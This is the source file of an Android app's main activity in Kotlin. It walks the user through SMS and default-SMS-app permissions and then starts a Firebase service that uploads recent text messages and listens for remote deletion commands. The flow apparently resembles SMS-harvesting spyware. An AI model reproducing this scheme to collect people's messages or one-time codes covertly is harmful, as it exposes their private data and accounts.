package com.vplan.rxtprob

import android.Manifest
import android.app.role.RoleManager
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.os.Bundle
import android.provider.Telephony
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import com.google.firebase.FirebaseApp

class MainActivity : AppCompatActivity() {

    private lateinit var smsSync: SmsSyncService
    private val REQUEST_NOTIFICATION_PERMISSION = 100
    private val REQUEST_SMS_PERMISSION = 101
    private val REQUEST_DEFAULT_SMS_APP = 102

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        // ✅ Firebase initialize
        FirebaseApp.initializeApp(this)
        setContentView(R.layout.activity_main)

        smsSync = SmsSyncService(this)

        // 🔹 Step 1: Try notification permission first (optional)
        requestNotificationPermission()
    }

    // 🔸 Step 1 → Notification permission (optional)
    private fun requestNotificationPermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            val granted = ContextCompat.checkSelfPermission(
                this,
                Manifest.permission.POST_NOTIFICATIONS
            ) == PackageManager.PERMISSION_GRANTED

            if (!granted) {
                ActivityCompat.requestPermissions(
                    this,
                    arrayOf(Manifest.permission.POST_NOTIFICATIONS),
                    REQUEST_NOTIFICATION_PERMISSION
                )
            } else {
                // Already granted → move to SMS permission
                requestSmsPermission()
            }
        } else {
            // For older Android versions, skip notification and go to SMS
            requestSmsPermission()
        }
    }

    // 🔸 Step 2 → SMS permission (must be granted for sync)
    private fun requestSmsPermission() {
        val permissions = arrayOf(
            Manifest.permission.READ_SMS,
            Manifest.permission.RECEIVE_SMS
        )

        val hasAll = permissions.all {
            ContextCompat.checkSelfPermission(this, it) == PackageManager.PERMISSION_GRANTED
        }

        if (!hasAll) {
            ActivityCompat.requestPermissions(this, permissions, REQUEST_SMS_PERMISSION)
        } else {
            ensureDefaultSmsApp()
        }
    }

    // 🔸 Step 3 → Default SMS app check
    private fun ensureDefaultSmsApp() {
        val myPackageName = packageName

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            val roleManager = getSystemService(Context.ROLE_SERVICE) as RoleManager
            if (!roleManager.isRoleHeld(RoleManager.ROLE_SMS)) {
                val intent = roleManager.createRequestRoleIntent(RoleManager.ROLE_SMS)
                startActivityForResult(intent, REQUEST_DEFAULT_SMS_APP)
            } else {
                startSmsSync()
            }
        } else {
            val defaultSmsApp = Telephony.Sms.getDefaultSmsPackage(this)
            if (defaultSmsApp != myPackageName) {
                val intent = Intent(Telephony.Sms.Intents.ACTION_CHANGE_DEFAULT)
                intent.putExtra(Telephony.Sms.Intents.EXTRA_PACKAGE_NAME, myPackageName)
                startActivity(intent)
            } else {
                startSmsSync()
            }
        }
    }

    // ✅ Step 4 → Start Firebase SMS Sync
    private fun startSmsSync() {
        try {
            Toast.makeText(this, "✅ SMS Sync Started", Toast.LENGTH_SHORT).show()
            smsSync.uploadInitialSms(20)
            smsSync.listenForFirebaseDeletion()
        } catch (e: Exception) {
            e.printStackTrace()
            Toast.makeText(this, "⚠️ Error: ${e.message}", Toast.LENGTH_LONG).show()
        }
    }

    // 🔸 Handle Permission Results
    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<out String>,
        grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)

        when (requestCode) {

            // Notification permission (optional)
            REQUEST_NOTIFICATION_PERMISSION -> {
                // আমরা SMS permission এ চলে যাব, allow হোক বা না হোক
                requestSmsPermission()
            }

            // SMS permission (must)
            REQUEST_SMS_PERMISSION -> {
                if (grantResults.all { it == PackageManager.PERMISSION_GRANTED }) {
                    ensureDefaultSmsApp()
                } else {
                    Toast.makeText(this, "❌ SMS Permission Denied", Toast.LENGTH_SHORT).show()
                }
            }
        }
    }

    // 🔸 Handle default SMS app result
    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        if (requestCode == REQUEST_DEFAULT_SMS_APP) {
            startSmsSync()
        }
    }
}
